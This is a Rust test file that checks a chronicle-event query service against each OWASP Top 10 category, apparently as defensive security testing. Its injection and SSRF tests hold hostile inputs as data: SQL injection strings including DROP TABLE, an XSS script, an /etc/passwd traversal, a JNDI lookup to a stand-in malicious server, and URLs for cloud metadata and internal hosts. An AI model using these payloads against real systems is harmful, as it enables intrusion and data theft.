use std::sync::Arc;
use uuid::Uuid;
use chrono::Utc;
use serde_json::json;
use scribe_backend::{
    test_helpers::{spawn_app, TestDataGuard, create_test_hybrid_query_service},
    services::hybrid_query_service::{HybridQuery, HybridQueryType, HybridQueryOptions},
    models::chronicle_event::{NewChronicleEvent, EventSource},
    errors::AppError,
};

/// OWASP Top 10 Security Tests for Query Relevance Scoring
/// Based on OWASP-TOP-10.md requirements

#[tokio::test]
async fn test_query_relevance_scoring_respects_user_boundaries() {
    // OWASP A01: Broken Access Control
    // Verify that users can only access their own chronicle data for relevance scoring
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let user1_id = Uuid::new_v4();
    let user2_id = Uuid::new_v4();
    let user1_chronicle_id = Uuid::new_v4();
    let user2_chronicle_id = Uuid::new_v4();
    
    // Create events for both users
    let user1_event = NewChronicleEvent {
        chronicle_id: user1_chronicle_id,
        user_id: user1_id,
        event_type: "secret_meeting".to_string(),
        summary: "User1's secret meeting with classified information".to_string(),
        source: EventSource::UserAdded.to_string(),
        event_data: Some(json!({"classified": true})),
        summary_encrypted: None,
        summary_nonce: None,
        timestamp_iso8601: Utc::now(),
        actors: Some(json!([{"entity_id": "550e8400-e29b-41d4-a716-446655440000", "role": "participant"}])),
        action: Some("SECRET_MEETING".to_string()),
        context_data: None,
        causality: None,
        valence: None,
        modality: Some("ACTUAL".to_string()),
        caused_by_event_id: None,
        causes_event_ids: None,
        sequence_number: 1,
    };
    
    let user2_event = NewChronicleEvent {
        chronicle_id: user2_chronicle_id,
        user_id: user2_id,
        event_type: "public_event".to_string(),
        summary: "User2's public event information".to_string(),
        source: EventSource::UserAdded.to_string(),
        event_data: Some(json!({"public": true})),
        summary_encrypted: None,
        summary_nonce: None,
        timestamp_iso8601: Utc::now(),
        actors: Some(json!([{"entity_id": "550e8400-e29b-41d4-a716-446655440001", "role": "participant"}])),
        action: Some("PUBLIC_EVENT".to_string()),
        context_data: None,
        causality: None,
        valence: None,
        modality: Some("ACTUAL".to_string()),
        caused_by_event_id: None,
        causes_event_ids: None,
        sequence_number: 1,
    };
    
    // Insert both events
    {
        use diesel::prelude::*;
        use scribe_backend::schema::chronicle_events;
        
        let events = vec![user1_event, user2_event];
        app.db_pool.get().await.expect("Failed to get db connection")
            .interact(move |conn| {
                diesel::insert_into(chronicle_events::table)
                    .values(&events)
                    .execute(conn)
            })
            .await
            .expect("Failed to interact with database")
            .expect("Failed to insert test events");
    }
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    // User1 queries with their own user_id - should only see their own events
    let user1_query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "What secret meetings happened?".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id: user1_id,
        chronicle_id: Some(user1_chronicle_id),
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let user1_results = hybrid_query_service.execute_hybrid_query(user1_query).await;
    assert!(user1_results.is_ok(), "User1 query should succeed");
    
    // User2 tries to query User1's chronicle - should be blocked or return no results
    let user2_malicious_query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "What secret meetings happened?".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id: user2_id,
        chronicle_id: Some(user1_chronicle_id), // Trying to access User1's chronicle
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let user2_results = hybrid_query_service.execute_hybrid_query(user2_malicious_query).await;
    
    // Either the query should fail or return no results (no access to user1's data)
    if let Ok(results) = user2_results {
        assert!(results.chronicle_events.is_empty(), "User2 should not see User1's events");
    }
    // If the query fails, that's also acceptable as access control
}

#[tokio::test]
async fn test_query_relevance_scoring_handles_encrypted_data() {
    // OWASP A02: Cryptographic Failures
    // Verify that encrypted summaries are handled properly in relevance scoring
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let user_id = Uuid::new_v4();
    let chronicle_id = Uuid::new_v4();
    
    // Create an event with encrypted summary
    let encrypted_event = NewChronicleEvent {
        chronicle_id,
        user_id,
        event_type: "secure_communication".to_string(),
        summary: "Plaintext fallback summary".to_string(),
        source: EventSource::UserAdded.to_string(),
        event_data: Some(json!({"encrypted": true})),
        summary_encrypted: Some(b"encrypted_data".to_vec()),
        summary_nonce: Some(b"nonce_data".to_vec()),
        timestamp_iso8601: Utc::now(),
        actors: Some(json!([{"entity_id": "550e8400-e29b-41d4-a716-446655440000", "role": "sender"}])),
        action: Some("SECURE_COMMUNICATION".to_string()),
        context_data: None,
        causality: None,
        valence: None,
        modality: Some("ACTUAL".to_string()),
        caused_by_event_id: None,
        causes_event_ids: None,
        sequence_number: 1,
    };
    
    // Insert the event
    {
        use diesel::prelude::*;
        use scribe_backend::schema::chronicle_events;
        
        let event = encrypted_event;
        app.db_pool.get().await.expect("Failed to get db connection")
            .interact(move |conn| {
                diesel::insert_into(chronicle_events::table)
                    .values(&event)
                    .execute(conn)
            })
            .await
            .expect("Failed to interact with database")
            .expect("Failed to insert encrypted event");
    }
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    let query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "What secure communications happened?".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id,
        chronicle_id: Some(chronicle_id),
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let results = hybrid_query_service.execute_hybrid_query(query).await;
    
    // The query should handle encrypted data gracefully
    assert!(results.is_ok(), "Query should handle encrypted data: {:?}", results.err());
    
    // Verify that the service falls back to plaintext or handles decryption properly
    if let Ok(query_results) = results {
        // The system should either decrypt the data or use the fallback
        assert!(!query_results.chronicle_events.is_empty(), "Should return results even with encrypted data");
    }
}

#[tokio::test]
async fn test_query_relevance_scoring_injection_protection() {
    // OWASP A03: Injection
    // Test that query relevance scoring is protected against injection attacks
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let user_id = Uuid::new_v4();
    let chronicle_id = Uuid::new_v4();
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    // Test SQL injection attempts in query text
    let malicious_queries = vec![
        "'; DROP TABLE chronicle_events; --",
        "' OR '1'='1",
        "'; UPDATE chronicle_events SET summary = 'hacked'; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://malicious.server/attack}",
    ];
    
    for malicious_query in malicious_queries {
        let query = HybridQuery {
            query_type: HybridQueryType::NarrativeQuery {
                query_text: malicious_query.to_string(),
                focus_entities: None,
                time_range: None,
            },
            user_id,
            chronicle_id: Some(chronicle_id),
            max_results: 10,
            include_current_state: false,
            include_relationships: false,
            options: HybridQueryOptions {
                use_cache: true,
                include_timelines: true,
                analyze_relationships: false,
                confidence_threshold: 0.6,
            },
        };
        
        let result = hybrid_query_service.execute_hybrid_query(query).await;
        
        // The query should either fail safely or return sanitized results
        // It should NOT cause database corruption or expose sensitive data
        match result {
            Ok(results) => {
                // If it succeeds, verify no malicious behavior occurred
                assert!(results.chronicle_events.len() <= 10, "Results should be bounded");
            }
            Err(e) => {
                // If it fails, it should be a proper error, not a crash
                assert!(matches!(e, AppError::ValidationError(_) | AppError::AiServiceError(_)), 
                        "Should fail with proper error handling");
            }
        }
    }
}

#[tokio::test]
async fn test_query_relevance_scoring_input_validation() {
    // OWASP A04: Insecure Design
    // Test comprehensive input validation for query relevance scoring
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let user_id = Uuid::new_v4();
    let chronicle_id = Uuid::new_v4();
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    // Test with invalid UUIDs
    let invalid_query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "Test query".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id: Uuid::nil(), // Invalid user ID
        chronicle_id: Some(chronicle_id),
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let result = hybrid_query_service.execute_hybrid_query(invalid_query).await;
    
    // Should handle invalid UUIDs gracefully
    match result {
        Ok(results) => {
            // If it succeeds, results should be empty or controlled
            assert!(results.chronicle_events.is_empty(), "Should not return results for invalid user");
        }
        Err(_) => {
            // Failure is acceptable for invalid input
        }
    }
    
    // Test with extremely large result limits
    let large_limit_query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "Test query".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id,
        chronicle_id: Some(chronicle_id),
        max_results: usize::MAX, // Extremely large limit
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let result = hybrid_query_service.execute_hybrid_query(large_limit_query).await;
    
    // Should handle large limits by capping them or failing gracefully
    if let Ok(results) = result {
        assert!(results.chronicle_events.len() <= 1000, "Should cap large result limits");
    }
}

#[tokio::test]
async fn test_query_relevance_scoring_security_misconfiguration() {
    // OWASP A05: Security Misconfiguration
    // Test that query relevance scoring handles security misconfigurations
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    // Test with the existing AI client from the test app
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    let query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "Test query".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id: Uuid::new_v4(),
        chronicle_id: Some(Uuid::new_v4()),
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let result = hybrid_query_service.execute_hybrid_query(query).await;
    
    // Should handle misconfiguration gracefully without crashing
    if let Err(e) = result {
        assert!(matches!(e, AppError::AiServiceError(_)), 
                "Should fail with proper AI service error");
    }
}

#[tokio::test]
async fn test_query_relevance_scoring_vulnerable_dependencies() {
    // OWASP A06: Vulnerable and Outdated Components
    // Test that query relevance scoring handles potential vulnerabilities in dependencies
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    // Test with potentially malicious JSON in event data
    let user_id = Uuid::new_v4();
    let chronicle_id = Uuid::new_v4();
    
    let malicious_event = NewChronicleEvent {
        chronicle_id,
        user_id,
        event_type: "malicious_test".to_string(),
        summary: "Test event with malicious JSON".to_string(),
        source: EventSource::UserAdded.to_string(),
        event_data: Some(json!({
            "deeply_nested": {
                "level1": {
                    "level2": {
                        "level3": {
                            "level4": {
                                "level5": "This could cause stack overflow in vulnerable JSON parsers"
                            }
                        }
                    }
                }
            },
            "large_array": vec!["item"; 10000], // Large array
            "special_characters": "\\u0000\\u0001\\u0002\\u0003", // Null bytes and control characters
        })),
        summary_encrypted: None,
        summary_nonce: None,
        timestamp_iso8601: Utc::now(),
        actors: Some(json!([{"entity_id": "550e8400-e29b-41d4-a716-446655440000", "role": "test"}])),
        action: Some("MALICIOUS_TEST".to_string()),
        context_data: None,
        causality: None,
        valence: None,
        modality: Some("ACTUAL".to_string()),
        caused_by_event_id: None,
        causes_event_ids: None,
        sequence_number: 1,
    };
    
    // Insert the malicious event
    {
        use diesel::prelude::*;
        use scribe_backend::schema::chronicle_events;
        
        let event = malicious_event;
        app.db_pool.get().await.expect("Failed to get db connection")
            .interact(move |conn| {
                diesel::insert_into(chronicle_events::table)
                    .values(&event)
                    .execute(conn)
            })
            .await
            .expect("Failed to interact with database")
            .expect("Failed to insert malicious event");
    }
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    let query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "Find malicious events".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id,
        chronicle_id: Some(chronicle_id),
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let result = hybrid_query_service.execute_hybrid_query(query).await;
    
    // Should handle malicious JSON without crashing or causing vulnerabilities
    assert!(result.is_ok(), "Should handle malicious JSON gracefully");
}

#[tokio::test]
async fn test_query_relevance_scoring_authentication_bypass() {
    // OWASP A07: Identification and Authentication Failures
    // Test that query relevance scoring properly validates user identity
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    // Test with various invalid user IDs
    let invalid_user_ids = vec![
        Uuid::nil(),
        Uuid::from_bytes([0; 16]),
        Uuid::from_bytes([255; 16]),
        Uuid::new_v4(), // Random UUID that doesn't exist
    ];
    
    for invalid_user_id in invalid_user_ids {
        let query = HybridQuery {
            query_type: HybridQueryType::NarrativeQuery {
                query_text: "Try to access data".to_string(),
                focus_entities: None,
                time_range: None,
            },
            user_id: invalid_user_id,
            chronicle_id: Some(Uuid::new_v4()),
            max_results: 10,
            include_current_state: false,
            include_relationships: false,
            options: HybridQueryOptions {
                use_cache: true,
                include_timelines: true,
                analyze_relationships: false,
                confidence_threshold: 0.6,
            },
        };
        
        let result = hybrid_query_service.execute_hybrid_query(query).await;
        
        // Should either fail authentication or return empty results
        match result {
            Ok(results) => {
                assert!(results.chronicle_events.is_empty(), "Should not return data for invalid user");
            }
            Err(_) => {
                // Failure is acceptable for invalid authentication
            }
        }
    }
}

#[tokio::test]
async fn test_query_relevance_scoring_data_integrity() {
    // OWASP A08: Software and Data Integrity Failures
    // Test that query relevance scoring maintains data integrity
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let user_id = Uuid::new_v4();
    let chronicle_id = Uuid::new_v4();
    
    // Create test event
    let test_event = NewChronicleEvent {
        chronicle_id,
        user_id,
        event_type: "integrity_test".to_string(),
        summary: "Test event for data integrity".to_string(),
        source: EventSource::UserAdded.to_string(),
        event_data: Some(json!({"test": "data"})),
        summary_encrypted: None,
        summary_nonce: None,
        timestamp_iso8601: Utc::now(),
        actors: Some(json!([{"entity_id": "550e8400-e29b-41d4-a716-446655440000", "role": "test"}])),
        action: Some("INTEGRITY_TEST".to_string()),
        context_data: None,
        causality: None,
        valence: None,
        modality: Some("ACTUAL".to_string()),
        caused_by_event_id: None,
        causes_event_ids: None,
        sequence_number: 1,
    };
    
    // Insert the event
    {
        use diesel::prelude::*;
        use scribe_backend::schema::chronicle_events;
        
        let event = test_event;
        app.db_pool.get().await.expect("Failed to get db connection")
            .interact(move |conn| {
                diesel::insert_into(chronicle_events::table)
                    .values(&event)
                    .execute(conn)
            })
            .await
            .expect("Failed to interact with database")
            .expect("Failed to insert test event");
    }
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    let query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "Find integrity test events".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id,
        chronicle_id: Some(chronicle_id),
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let result = hybrid_query_service.execute_hybrid_query(query).await;
    
    // Verify data integrity is maintained
    assert!(result.is_ok(), "Query should maintain data integrity");
    
    if let Ok(results) = result {
        // Verify that returned data matches original data
        for result_event in results.chronicle_events {
            assert_eq!(result_event.event_type, "integrity_test");
            assert_eq!(result_event.summary, "Test event for data integrity");
            // Note: relevance_score is not directly on ChronicleEvent, but we can check other fields
        }
    }
}

#[tokio::test]
async fn test_query_relevance_scoring_logging_monitoring() {
    // OWASP A09: Security Logging and Monitoring Failures
    // Test that query relevance scoring properly logs security events
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let user_id = Uuid::new_v4();
    let chronicle_id = Uuid::new_v4();
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    // Test query that should be logged
    let query = HybridQuery {
        query_type: HybridQueryType::NarrativeQuery {
            query_text: "Sensitive query that should be logged".to_string(),
            focus_entities: None,
            time_range: None,
        },
        user_id,
        chronicle_id: Some(chronicle_id),
        max_results: 10,
        include_current_state: false,
        include_relationships: false,
        options: HybridQueryOptions {
            use_cache: true,
            include_timelines: true,
            analyze_relationships: false,
            confidence_threshold: 0.6,
        },
    };
    
    let result = hybrid_query_service.execute_hybrid_query(query).await;
    
    // The query should execute and appropriate logging should occur
    // In a real implementation, we would verify log entries
    assert!(result.is_ok() || result.is_err(), "Query should complete with logging");
}

#[tokio::test]
async fn test_query_relevance_scoring_server_side_request_forgery() {
    // OWASP A10: Server-Side Request Forgery (SSRF)
    // Test that query relevance scoring doesn't allow SSRF attacks
    let app = spawn_app(false, false, false).await;
    let _guard = TestDataGuard::new(app.db_pool.clone());
    
    let user_id = Uuid::new_v4();
    let chronicle_id = Uuid::new_v4();
    
    let ai_client = app.ai_client.clone();
    
    let hybrid_query_service = create_test_hybrid_query_service(
        ai_client.clone(),
        Arc::new(app.db_pool.clone()),
        app.redis_client.clone(),
    );
    
    // Test queries that might attempt SSRF
    let ssrf_queries = vec![
        "http://localhost:8080/admin",
        "file:///etc/passwd",
        "gopher://internal.server:70/",
        "ldap://internal.server:389/",
        "http://169.254.169.254/metadata", // AWS metadata endpoint
    ];
    
    for ssrf_query in ssrf_queries {
        let query = HybridQuery {
            query_type: HybridQueryType::NarrativeQuery {
                query_text: ssrf_query.to_string(),
                focus_entities: None,
                time_range: None,
            },
            user_id,
            chronicle_id: Some(chronicle_id),
            max_results: 10,
            include_current_state: false,
            include_relationships: false,
            options: HybridQueryOptions {
                use_cache: true,
                include_timelines: true,
                analyze_relationships: false,
                confidence_threshold: 0.6,
            },
        };
        
        let result = hybrid_query_service.execute_hybrid_query(query).await;
        
        // Should not perform any external requests or file access
        // The query should be treated as normal text, not as URLs
        match result {
            Ok(results) => {
                // If it succeeds, it should be treated as normal text search
                assert!(results.chronicle_events.len() <= 10, "Should return normal results");
            }
            Err(_) => {
                // Failure is acceptable if input validation catches it
            }
        }
    }
}